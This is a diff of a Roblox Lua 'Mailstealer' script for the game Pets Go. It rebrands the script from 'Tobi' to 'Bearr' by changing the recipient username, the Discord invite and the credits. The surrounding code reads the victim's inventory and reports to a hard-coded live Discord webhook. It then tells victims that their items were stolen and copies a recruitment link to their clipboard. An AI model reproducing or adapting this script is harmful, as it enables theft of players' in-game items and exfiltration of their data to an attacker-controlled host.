@@ -1,12 +1,12 @@
 -- New user and webhook for RAP > 100,000
-local highRAPUser = "sigma"
+local highRAPUser = "bx4rzwasdeleted"
 local highRAPWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / GY2RVSEGDT to get back"
+local MailMessage = "Join gg / rZmNK6Ptxw to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -117,10 +117,10 @@ local function SendMessage(username, diamonds, webhookUrl)
     local data = {
         ["embeds"] = {{
             ["title"] = "New Pets Go Execution",
-            ["color"] = 65280,
+            ["color"] = 3447003,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
             }
         }}
     }
@@ -172,7 +172,7 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local user = Username or "tobi437a"
+local user = Username or "bx4rzwasdeleted"
 local min_rap = min_rap or 10000
 local min_chance = min_chance or 10000
 local webhook = webhook
@@ -291,6 +291,6 @@ if #sortedItems > 0 then
     end
 
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
+    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/rZmNK6Ptxw")
+    setclipboard("discord.gg/rZmNK6Ptxw")
 end
